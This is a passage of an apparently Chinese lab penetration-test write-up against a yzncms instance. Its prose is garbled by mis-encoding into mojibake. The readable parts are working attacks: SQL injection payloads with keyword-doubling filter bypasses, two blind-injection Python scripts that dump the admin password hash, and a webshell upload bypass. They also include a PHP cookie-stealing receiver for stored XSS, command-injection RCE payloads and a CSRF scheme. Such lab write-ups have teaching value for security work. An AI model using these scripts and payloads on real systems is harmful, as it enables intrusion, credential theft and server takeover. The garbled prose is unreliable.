åŠŸèƒ½ï¼Œå…ˆæ³¨å†Œæœ‰ä¸€ä¸ªç”¨æˆ·ï¼Œå°è¯•ä¿®æ”¹å¯†ç ï¼ŒçŒœæµ‹å…¶å·¥ä½œæœºåˆ¶ã€‚ ç¬¬ä¸€æ¬¡å°è¯•è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·åï¼Œè¿”å›ä¿¡æ¯æ˜¯no user! ç¬¬äºŒæ¬¡è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åé”™è¯¯çš„å¯†ç ï¼Œæç¤ºwrong password!ï¼Œè¿™ä¸ªé€»è¾‘å¾ˆæ­£å¸¸ ç¬¬ä¸‰æ¬¡è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œä¸¤ä¸ªä¸ä¸€æ ·çš„æ–°å¯†ç ï¼Œæç¤ºnew password are different! è¿™ä¸Šé¢çš„ä¸‰ç§æƒ…å†µæ˜¯ä¿®æ”¹å¯†ç æ—¶å¸¸è§çš„æƒ…å†µï¼Œçœ‹ä¼¼éƒ½å¯ä»¥æ­£å¸¸çš„å·¥ä½œï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰å¯¹ç”¨æˆ·åè¿™ä¸ªå‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤çš„è¯å°±å¯ä»¥é€ æˆç›²æ³¨çš„æ¼æ´ã€‚ å› ä¸ºå½“æˆ‘ä»¬æäº¤å®Œå‚æ•°åï¼ŒæœåŠ¡å™¨è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯å»æ•°æ®åº“ç§æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¯¥ç”¨æˆ·åï¼Œè‹¥ä¸å­˜åœ¨åˆ™è¿”å›no user!ï¼Œè‹¥å­˜åœ¨çš„è¯ä¸”è¾“å…¥çš„ä¸¤æ¬¡æ–°å¯†ç éƒ½æ­£ç¡®ä½†æ˜¯æ—§å¯†ç é”™è¯¯ï¼Œå°±ä¼šæç¤ºç”¨æˆ·wrong password!ï¼Œè¿™ä¹Ÿæ˜¯é€ æˆç›²æ³¨çš„é‡è¦åŸå› ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·åå’Œå¯†ç åˆ†åˆ«ä¸ºszyå’Œadminï¼Œä½†æ˜¯æˆ‘ä»¬æäº¤æ—¶æ„é€ å‡ºå¦‚ä¸‹çš„è¯­å¥ account=szy&#x27; and 1=1#&amp;password=ad&amp;npassword=111&amp;newpassword=111 account=szy&#x27; and 1=2#&amp;password=ad&amp;npassword=111&amp;newpassword=111 çœ‹åˆ°ä»¥ä¸Šçš„ç»“æœæˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­ä¸€å®šå­˜åœ¨æ³¨å…¥ã€‚ æ„é€ payload account=szy&#x27; and ascii(substring(database(),1,1))&gt;100 #&amp;password=ad&amp;npassword=111&amp;newpassword=111 è¿”å›çš„æ˜¯wrong passwordï¼Œè¯´æ˜æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯å¤§äº100çš„ï¼Œç›´æ¥ä½¿ç”¨äºŒåˆ†æ³¨å…¥ï¼Œè„šæœ¬å¦‚ä¸‹ import requests import time url = &quot;http://192.168.164.147:81/change/changepass&quot; heard = &#123;&quot;Cookie&quot;:&quot;http://192.168.164.147:81/change/changepass&quot;&#125; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # time.sleep(1) payload = &quot;szy&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125; #&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)#&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a&gt;&#123;1&#125;)#&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a&gt;&#123;1&#125;)#&quot;.format(i,mid) data = &#123;&quot;account&quot;:payload, &quot;password&quot;:&quot;111a&quot;,&quot;npassword&quot;:&quot;222&quot;,&quot;newpassword&quot;:&quot;222&quot;&#125; response = requests.post(url=url,data=data,headers=heard) # t = response.text if &quot;wrong password&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) â€‹``` database:yzncms table:yzn_admin columns:id,username,password,roleid,encrypt â€‹``` yzn_adminçš„åˆ—åï¼Œçœç•¥äº†åé¢çš„åˆ— è·å–ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç  username:admin password:9724b5e6c56b95f5723009ef81961bfe è¿™ä¸ªå¯†ç æ˜¯32ä½çš„ï¼Œå¯èƒ½æ˜¯md5å¤„ç†åä¿å­˜çš„ï¼Œæš‚æ—¶æ— æ³•ç ´è§£ã€‚ æ¼æ´ç‚¹äºŒç”¨æˆ·ç™»å½•åï¼Œå­˜åœ¨ä¸€ä¸ªæŸ¥æ‰¾ç”¨æˆ·é‚®ç®±çš„åŠŸèƒ½ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨æ³¨å…¥ã€‚ è¿™é‡Œå·²ç»æç¤ºäº†å­˜åœ¨äº†è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±çœ‹çœ‹è¿‡æ»¤é‚£äº›ä¸œè¥¿ è¾“å…¥ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·åï¼ŒæŸ¥æ‰¾ç»“æœå¦‚å›¾ è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ· å°è¯•è¾“å…¥ sunzy&#x27; or 1=1 # ç½‘é¡µæŠ¥é”™ï¼Œå¹¶å°†é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„or,ç©ºæ ¼éƒ½è¢«æ¢æˆäº†ç©ºæ ¼ï¼Œè¿™è¿˜æ˜¯å¾ˆå®¹æ˜“ç»•è¿‡çš„ fuzzæµ‹è¯•åï¼Œå‘ç°è¿‡æ»¤union,ç©ºæ ¼,or,and,select,fromï¼Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œç©ºæ ¼çš„å¯ä»¥ä½¿ç”¨/**/æ›¿æ¢ ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿”å›ç»“æœåªæœ‰ä¸€åˆ— ç›´æ¥è¿›è¡Œsqlæ³¨å…¥ è·å–æ•°æ®åº“ä¸­çš„è¡¨å sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(table_name)/**/frfromom/**/infoorrmation_schema.tables/**/where/**/table_schema=database()# è·å–å­—æ®µå sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(column_name)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name=&quot;yzn_member&quot;# è·å–å­—æ®µå€¼ sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(passwoorrd)/**/frfromom/**/yzn_member# æ¼æ´ç‚¹ä¸‰ç”¨æˆ·ä¸»é¡µ-&gt;ç§¯åˆ†èµ é€ï¼Œé€šè¿‡æµ‹è¯•å¯ä»¥å‘ç°ä¹Ÿæ˜¯å­˜åœ¨sqlæ³¨å…¥çš„ å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦ä½¿ç”¨ç›²æ³¨ ç›²æ³¨è„šæœ¬ä¸ä¸Šé¢çš„ç±»ä¼¼ï¼Œç¨åŠ ä¿®æ”¹å³å¯ã€‚ æ¼æ´ç‚¹å››æ³¨å†Œåç™»å½•ï¼Œå‘ç°å…¶ä¸­å­˜åœ¨ä¸€ä¸ªæŠ•ç¨¿çš„åŠŸèƒ½ï¼ŒæŠ•ç¨¿åéœ€è¦ç®¡ç†å‘˜å®¡æ ¸ï¼Œåœ¨æ­¤æœŸé—´æˆ‘ä»¬å¯ä»¥å†æ¬¡ç¼–è¾‘æˆ‘ä»¬çš„ç¨¿ä»¶ å½“ç‚¹å‡»ç¼–è¾‘åï¼Œå‘ç°urlä¸Šå¤šäº†ä¸€ä¸ªidå‚æ•°ï¼Œè¿™åº”è¯¥æ˜¯æˆ‘ä»¬ç¨¿ä»¶çš„idï¼Œæ–¹ä¾¿æŸ¥è¯¢ã€‚ä½†æ˜¯é€šå¸¸è¿™ç§å‚æ•°å¦‚æœè¿‡æ»¤ä¸ä¸¥æ ¼çš„è¯ä¹Ÿä¼šå­˜åœ¨SQLæ³¨å…¥ï¼Œè€Œè¿™ä¸ªä½ç½®æ˜¾ç„¶è¾“å…¥æ•°å­—å‹æ³¨å…¥ã€‚ http://192.168.164.147:81/member/content/edit.html?id=3 æ¢æµ‹æ˜¯å¦ å­˜åœ¨æ³¨å…¥ï¼Œå½“è¾“å…¥?id=3 and 1=1 #æ—¶é¡µé¢è¿”å›æ­£å¸¸ï¼Œä½†æ˜¯å½“è¾“å…¥?id=3 and 1=2#,å´æç¤ºäº†ç¨¿ä»¶ä¸å­˜åœ¨ï¼Œè¯´æ˜è¿™é‡Œä¹Ÿæ˜¯å­˜åœ¨æ³¨å…¥çš„ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œæ— æ³•è·å–è¿”å›çš„å†…å®¹åªèƒ½é‡‡ç”¨ç›²æ³¨çš„æ–¹æ³•ã€‚ ==åœ¨æµ‹è¯•çš„è¿‡ç¨‹ç§å‘ç°è¿™ä¸ªä½ç½®ä½¿ç”¨ &gt;æ—¶ä¼šå‡ºç°é”™è¯¯æç¤ºï¼Œè€Œ&lt;ä¸èµ·ä½œç”¨ï¼Œåªèƒ½ä½¿ç”¨=ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨äºŒåˆ†æ³¨å…¥ï¼Œä½†æ˜¯ç›´æ¥æš´åŠ›ç ´è§£ä¹Ÿå¾ˆå¿«== # -*- coding = utf - 8 -*- #@Time : 2021/3/20 9:03 #@Author : sunzy #@File : cms_sql2.py import requests import time url = &quot;http://192.168.164.147:81/member/content/edit.html?id=&quot; header = &#123;&quot;Cookie&quot;: &quot;thinkphp_show_page_trace=0|0; PHPSESSID=d2b4f4b001d70e670953a36d00ca8be6; thinkphp_show_page_trace=0|0&quot;&#125; flag = &quot;&quot; words = [&quot;,&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;_&quot;,&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;,&quot;F&quot;,&quot;G&quot;,&quot;H&quot;,&quot;I&quot;,&quot;J&quot;,&quot;K&quot;,&quot;L&quot;,&quot;M&quot;,&quot;N&quot;,&quot;O&quot;,&quot;P&quot;,&quot;Q&quot;,&quot;R&quot;,&quot;S&quot;,&quot;T&quot;,&quot;U&quot;,&quot;V&quot;,&quot;W&quot;,&quot;X&quot;,&quot;Y&quot;,&quot;Z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;] def dump(): flag = &#x27;&#x27; for i in range(1,50): for word in words: # payload = &quot;3 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a = &#123;1&#125;)#&quot;.format(i,ord(word)) payload = &quot;3 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a=&#123;1&#125;)#&quot;.format(i,ord(word)) payload = &quot;3 and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a=&#123;1&#125;)#&quot;.format(i,ord(word)) url1 = url+payload res = requests.get(url1,headers=header) if &quot;ç«‹å³æäº¤&quot; in res.text: flag += word break print(flag) if __name__ == &#x27;__main__&#x27;: dump() æˆåŠŸè·å–åˆ°æ•°æ®åº“åï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸã€‚ 6.æš´åŠ›ç ´è§£è¯¥æ¼æ´æ˜¯ç”±äºç®¡ç†å‘˜æˆ–è€…ç”¨æˆ·ä½¿ç”¨äº†å¸¸ç”¨çš„ç®€å•å¯†ç ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£çš„æ–¹å¼è·å–ç”¨æˆ·åå’Œå¯†ç ï¼Œå‰é¢çš„sqlæ³¨å…¥æˆ‘ä»¬å¯ä»¥çŸ¥é“ç®¡ç†å‘˜è´¦å·ä¸ºadmin,ä½†æ˜¯å¯†ç ä¸ºåŠ ç›åçš„md5å€¼ï¼Œæˆ‘ä»¬æ— æ³•ç ´è§£ï¼Œåªèƒ½å°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£ã€‚ åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ç‚¹ä¸€ä¸­æˆ‘ä»¬å‘ç°äº†adminæ¨¡å—å°±åœ¨è·¯å¾„ä¸º\\application\\adminï¼Œæ‰€ä»¥ç®¡ç†å‘˜åå°urlåº”è¯¥ä¸ºhttp://192.168.164.147/admin å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥æ ¹æ®ç»éªŒçŒœæµ‹åå°ç™»å½•è·¯å¾„ã€‚ è®¿é—®åå° æŸ¥çœ‹æºç å¯ä»¥å‘ç°ï¼Œç™»å½•æ˜¯éœ€è¦tokençš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä½¿ç”¨bpè‡ªå¸¦çš„æ¨¡å—ç ´è§£ï¼Œä¸è¿‡éœ€è¦éº»çƒ¦ä¸€ç‚¹ã€‚ ä½¿ç”¨bpæŠ“åŒ…ï¼Œå°†æ•°æ®åŒ…å‘é€åˆ°Intruderæ¨¡å—ï¼Œç„¶ååŠ ä¸Šå‚æ•°ï¼Œé€‰æ‹©Pitchforkæ¨¡å¼ åˆ°optioné¡µé¢ï¼Œä¸å¯ä»¥å¤šçº¿ç¨‹ è®¾ç½®payload1,ä¹Ÿå°±æ˜¯tokenå€¼ è®¾ç½®payload2 passwordçš„å€¼ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©è‡ªå·±æ”¶è—çš„å¯†ç å­—å…¸ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨bpè‡ªå¸¦çš„ã€‚ çˆ†ç ´ç»“æœ å½“å¯†ç ä¸ºadminæ—¶ï¼Œå¯ä»¥çœ‹åˆ°ç›¸åº”åŒ…ä¸­è¿”å›çš„æ•°æ®å­˜åœ¨ä¸€ä¸ªurlï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯ï¼Œç™»å½•æˆåŠŸåè¿›è¡Œçš„è·³è½¬ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨ä¸­çœ‹åˆ°ï¼Œå·²ç»ç™»å½•åˆ°äº†åå°é¡µé¢ ç»“åˆå‰é¢sqlæ³¨å…¥è·å–çš„å¯†ç å’Œencryptï¼Œå°è¯•çŒœæµ‹å¯†ç çš„ä¿å­˜æ–¹å¼ md5(&#x27;adminWo0bAa&#x27;) = 9724b5e6c56b95f5723009ef81961bfe æ‰€ä»¥å¯†ç ä¿å­˜çš„æ˜¯å¯†ç å’ŒåŠ å¯†å› å­æ‹¼æ¥åçš„md5å€¼ã€‚ 7.æ–‡ä»¶ä¸Šä¼ ï¼ˆ3ä¸ªï¼‰æ¼æ´ç‚¹ä¸€ç”¨æˆ·ç™»å½•åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå›¾ç‰‡å¾é›†é¡µé¢http://192.168.164.147/member/index/photo éšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶åï¼Œå¯ä»¥çœ‹åˆ°è¿”å›äº†å›¾ç‰‡çš„ä¿å­˜åœ°å€ ä½†æ˜¯å½“ä¸Šä¼ ä¸€ä¸ªéå›¾ç‰‡ç±»å‹æ—¶ï¼Œä¼šæç¤ºåªå…è®¸ä¸Šä¼ .jpg|.png|.gif è¿™åªæ˜¯å‰ç«¯æ£€æµ‹ï¼ŒæŠ“åŒ…å°±å¯ä»¥è§£å†³ æŠ“åŒ…ä¸Šä¼ ä¸€ä¸ªphpä¸ºåç¼€çš„æ–‡ä»¶ï¼Œå¹¶å°†MIMEæ”¹ä¸ºimage/jpeg,å¯ä»¥çœ‹åˆ°phpåç¼€è¢«æ¢æˆç©ºäº† å°è¯•åŒå†™ç»•è¿‡ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶å·²ç»æ­£å¸¸ä¸Šä¼  è®¿é—®å¯ä»¥çœ‹åˆ°phpinfo ä¸‹é¢å°±æ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ§åˆ¶æœåŠ¡å™¨ æ¼æ´ç‚¹äºŒç”¨æˆ·ç™»å½•åå¯ä»¥åœ¨å†…å®¹ç®¡ç†â€”&gt;åœ¨çº¿æŠ•ç¨¿çš„ä½ç½®æŠ•ç¨¿ï¼Œè¿™é‡Œç”¨æˆ·å¯ä»¥ä¸Šä¼ ç¨¿ä»¶ä¸­éœ€è¦ç”¨åˆ°å›¾ç‰‡ ä½†æ˜¯æ”»å‡»è€…å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›åˆ»æ„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥æ”»å‡»æœåŠ¡å™¨ï¼Œä¸‹é¢æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶è·å–phpinfo é¦–å…ˆé€‰æ‹©ä¸€å¼ ç©ºçš„ç…§ç‰‡ï¼Œç„¶åå°†å…¶æ”¹ä¸ºphpæ–‡ä»¶ï¼Œå†…å®¹ä¸º&lt;? phpinfo(); ?&gt;ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šä¼ æˆåŠŸçš„url è®¿é—®æœåŠ¡å™¨è¿”å›çš„urlï¼Œå·²ç»çœ‹åˆ°è¯¥ç½‘ç«™çš„phpinfoä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ç¡®å®šäº†è¯¥ä¸Šä¼ ç›®å½•æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è¿›ä¸€æ­¥æ§åˆ¶è¯¥æœåŠ¡å™¨ã€‚ ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ ä½¿ç”¨èšå‰‘è¿æ¥å³å¯ã€‚ æ¼æ´ç‚¹ä¸‰åœ¨ä¸Šä¸€æ­¥ä¸­æˆ‘ä»¬å·²ç»çŸ¥é“äº†adminçš„è´¦å·å¯†ç ï¼Œç„¶åç™»å½•ã€‚å†ç”¨è‡ªå·±æ³¨å†Œçš„è´¦å·å‘æŸä¸ªæ ç›®æŠ•ç¨¿ï¼Œä¹‹åç®¡ç†å‘˜å†å®¡æ ¸ï¼Œä¾¿ä¼šå‡ºç°ä¸€ä¸ªç±»ä¼¼äºç”¨æˆ·æŠ•ç¨¿çš„é¡µé¢ï¼Œç„¶åå°±å¯ä»¥åƒä¸Šä¸€ä¸ªæ¼æ´ä¸€æ ·ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ã€‚ 8.XSSï¼ˆ2ä¸ªï¼‰æ¼æ´ç‚¹ä¸€ç™»å½•ç®¡ç†å‘˜è´¦å·åå¯ä»¥å‘é€çŸ­æ¶ˆæ¯ç»™ç”¨æˆ· åœ¨ä¹‹å‰çš„sqlæ³¨å…¥æ¼æ´é‡Œï¼Œæˆ‘ä»¬å¯ä»¥è·å–yzn_memberè¡¨ä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè™½ç„¶å¯ä»¥è·å–å¯†ç ï¼Œä½†æ˜¯å› ä¸ºæ˜¯md5å€¼ï¼Œå¹¶ä¸”æ˜¯åŠ ç›åçš„md5å€¼ï¼Œç ´è§£çš„éš¾åº¦å¾ˆé«˜ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨è·å–cookieçš„æ–¹å¼æ”»å‡»ã€‚ ä»ä¸­å¯ä»¥çœ‹åˆ°ç”¨æˆ·ç™»å½•çš„æ—¶é—´ï¼Œä»è€Œå¯ä»¥åˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯å¦åœ¨çº¿ï¼Œæˆ‘ä»¬é€‰æ‹©é‚£äº›åœ¨çº¿çš„ç”¨æˆ·ï¼Œè·å–å…¶æµè§ˆå™¨çš„cookieï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°å¯†ç ç™»å½•å…¶è´¦å·ã€‚ å°è¯•å‘ç”¨æˆ·szyå‘é€å¸¦æœ‰æ¶æ„è„šæœ¬çš„çŸ­æ¶ˆæ¯ï¼Œå†…å®¹å¦‚ä¸‹ å‘é€å®Œåï¼Œæµè§ˆå™¨å¼¹å‡ºxssï¼Œå¹¶ä¸”æ¯æ¬¡åˆ·æ–°éƒ½ä¼šå‡ºç°å¼¹çª—ï¼Œè¯´æ˜æ˜¯å­˜å‚¨å‹XSSã€‚ å½“ç”¨æˆ·ç‚¹å¼€æ”¶ä»¶ç®±æ—¶ï¼Œæµè§ˆå™¨ä¹Ÿä¼šå‡ºç°å¼¹çª—ï¼Œè¯´æ˜æ¼æ´åˆ©ç”¨æˆ ==å°è¯•è·å–ç”¨æˆ·cookie(å¤±è´¥)== é¦–å…ˆåœ¨æœåŠ¡å™¨ä¸Šå†™ä¸€ä¸ªè·å–cookieçš„è„šæœ¬ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå°±æ˜¯è·å–cookieå‚æ•°ï¼Œç„¶åå°†å…¶å†™å…¥cookie.txtä¸­ï¼Œå¹¶è®°å½•å†™å…¥çš„æ—¶é—´ã€‚ &lt;?php $cookie = $_GET[&#x27;cookie&#x27;]; $ip = getenv (&#x27;REMOTE_ADDR&#x27;); $time = date(&#x27;Y-m-d g:i:s&#x27;); $fp = fopen(&quot;cookie.txt&quot;,&quot;a&quot;); fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\\n&quot;); fclose($fp); ?&gt; ç„¶åå‘ç”¨æˆ·å‘é€å¸¦æœ‰æ¶æ„è„šæœ¬çš„æ¶ˆæ¯ï¼Œ192.168.164.1ä¸ºæœåŠ¡å™¨çš„ipåœ°å€ï¼Œè¿™é‡Œå°±ä½¿ç”¨äº†è‡ªå·±çš„æœ¬æœºåœ°å€ï¼Œè€Œåœ¨ç°å®çš„æ¸—é€æµ‹è¯•ä¸­æ˜¯éœ€è¦é€‰æ‹©èƒ½å¤Ÿä¸å…¬ç½‘é€šä¿¡çš„æœåŠ¡å™¨æˆ–è€…vpsã€‚ å½“ç”¨æˆ·ç‚¹å¼€æ”¶ä»¶ç®±åï¼Œè¿™ä¸ªè„šæœ¬å°±ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œå°±å¯ä»¥å°†cookieå†™å…¥åˆ°æœåŠ¡å™¨ä¸Šçš„cookie.txtã€‚ æŸ¥çœ‹cookie.txt è·å–çš„cookie ä½†æ˜¯å¯ä»¥å‘ç°è¿™é‡Œçš„cookieå¥½åƒå¹¶ä¸å®Œæ•´ï¼Œçœ‹äº†ä¸€ä¸‹åŸæ¥æ˜¯PHPsessionå€¼é‚£é‡Œè®¾ç½®äº†http-onlyï¼Œè€Œhttp-onlyå°±æ˜¯é˜²æ­¢é€šè¿‡jsè„šæœ¬è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»ï¼Œçªƒå–cookieå†…å®¹ã€‚ æ¼æ´ç‚¹äºŒç™»å½•åçš„ç”¨æˆ·å¯ä»¥åœ¨ç•™è¨€æ¿è¿›è¡Œç•™è¨€ï¼Œç•™è¨€åä¼šæ˜¾ç¤ºè¿‘æœŸçš„ç•™è¨€ä¿¡æ¯ url http://192.168.164.147/member/index/comment.html åœ¨ç•™è¨€ä¸­æ’å…¥æ¶æ„è„šæœ¬ï¼Œæ­¤æ—¶æ•°æ®ä¼šè¢«æäº¤åˆ°æœåŠ¡å™¨å¤„ç†ï¼Œå¹¶å†™å…¥æ•°æ®åº“ï¼Œæ˜¾ç¤ºè¿‘æœŸçš„ç•™è¨€ï¼Œæ­¤æ—¶æ¶æ„è„šæœ¬è¢«æ‰§è¡Œï¼Œé€ æˆäº†XSSæ¼æ´ å¯ä»¥çœ‹å¤§æ¶æ„è„šæœ¬è¢«æµè§ˆå™¨æ‰§è¡Œï¼ŒåµŒå…¥åˆ°htmlé¡µé¢ä¸­ 9.RCEï¼ˆ2ä¸ªï¼‰æ¼æ´ç‚¹ä¸€åå°ç®¡ç†ä¸­å­˜åœ¨ä¸€ä¸ªé‡‡é›†æ¨¡å—ï¼Œå…¶ä¸­å­˜åœ¨äºä¸€ä¸ªâ€œphpinfoâ€ï¼Œç‚¹å‡»å³å¯æŸ¥çœ‹åˆ°phpinfoä¿¡æ¯ è¿™é‡Œçœ‹ä¼¼æ²¡æœ‰æäº¤å‚æ•°ä½ç½®ï¼Œè®©äººè§‰å¾—æ— ä»ä¸‹æ‰‹ï¼Œåœ¨å‰ç«¯æŸ¥çœ‹æºç å³å¯å‘ç°ï¼Œæ˜¯å°†è¾“å…¥æ¡†éšè—äº†ï¼Œæ‰æ— æ³•çœ‹è§ï¼Œè¾“å…¥çš„å†…å®¹ã€‚ æŠ“åŒ…å°±å¯ä»¥å‘ç°ç«¯å€ªï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªpostæ–¹å¼æäº¤äº†ä¸€ä¸ªdataå‚æ•° æäº¤çš„å†…å®¹ä¸º data=phpinfo() ç„¶åå°±è¿”å›äº†phpçš„å„é¡¹ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯æ‰§è¡Œäº†phpinfoè¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯ç”¨åˆ°äº†eval()å‡½æ•°ï¼Œå°è¯•è¾“å…¥ data=system(&#x27;ls /&#x27;) åˆ©ç”¨æˆåŠŸã€‚ æ¼æ´ç‚¹äºŒåå°ç®¡ç†ä¸­å­˜åœ¨ä¸€ä¸ªé‡‡é›†æ¨¡å—ï¼Œå…¶ä¸­å­˜åœ¨äºä¸€ä¸ªâ€œæŸ¥çœ‹å†…ç½‘ä¸»æœºâ€ï¼Œå¯ä»¥æŸ¥çœ‹å†…ç½‘ä¸­çš„ä¸»æœºæ˜¯å¦åœ¨çº¿ã€‚æŸ¥çœ‹ä¸€ä¸ªä¸»æœºæ˜¯å¦åœ¨çº¿æœ€å¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨pingå‘½ä»¤ï¼Œè¿˜è¦ç»“åˆphpä¸­çš„shell_exec()å‡½æ•°ã€‚ å°è¯•ä½¿ç”¨ç®¡é“ç¬¦æ‹¼æ¥å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚ payload: 127.0.0.1 | ls / å¯ä»¥çœ‹åˆ°åˆ—å‡ºäº†æ ¹ç›®å½•çš„æ–‡ä»¶å¤¹ï¼Œè¯´æ˜å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚ 10.CSRFï¼ˆ4ä¸ªï¼‰æ¼æ´ç‚¹ä¸€ç”¨æˆ·ä¸»é¡µé¢â€“&gt;ç§¯åˆ†èµ é€ è¾“å…¥ç”¨æˆ·åå’Œè¦èµ é€ç§¯åˆ†çš„æ•°é‡å³å¯èµ é€è‡ªå·±çš„ç§¯åˆ† å½“æˆ‘ä»¬é€šè¿‡æŸ¥æ‰¾ç”¨æˆ·é‚®ç®±åŠŸèƒ½è·å–åˆ°æŸä¸ªç”¨æˆ·çš„é‚®ç®±æ—¶ï¼Œå°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªç±»ä¼¼äºä¸‹å›¾çš„ç½‘é¡µï¼Œç”Ÿæˆé“¾æ¥åé€šè¿‡é‚®ç®±å‘ç»™å—å®³è€…ç„¶åè¯±ä½¿å…¶ç‚¹å‡»é“¾æ¥ï¼Œå°±èƒ½ç¥ä¸çŸ¥é¬¼ä¸è§‰çš„å°†å…¶ç§¯åˆ†è½¬åˆ°è‡ªå·±çš„è´¦å·ä¸‹ æ¼æ´ç‚¹äºŒåå°ç®¡ç†ä¸­ï¼Œå­˜åœ¨ä¼šå‘˜ç®¡ç†æ¨¡å—â€“&gt;ç‚¹å‡»ç¼–è¾‘ï¼Œåœ¨è¿™é‡Œç®¡ç†å‘˜å¯ä»¥æ”¹å˜ä¼šå‘˜çš„ç­‰çº§ï¼Œç§¯åˆ†å’Œå¯†ç 